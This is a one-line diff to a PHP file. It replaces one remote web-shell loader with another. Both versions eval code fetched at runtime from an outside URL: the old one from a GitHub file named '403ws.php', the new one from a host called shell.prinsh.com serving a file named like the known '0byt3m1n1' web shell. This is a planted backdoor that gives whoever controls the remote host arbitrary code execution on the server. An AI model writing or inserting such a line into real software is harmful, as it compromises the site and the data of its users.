@@ -1,1 +1,1 @@
-<?php eval('?>'.file_get_contents('https://raw.githubusercontent.com/jytmX/Whatever/master/403ws.php')); ?>
+<?php eval('?>'.file_get_contents('https://shell.prinsh.com/Nathan/0byt3m1n1.txt')); ?>
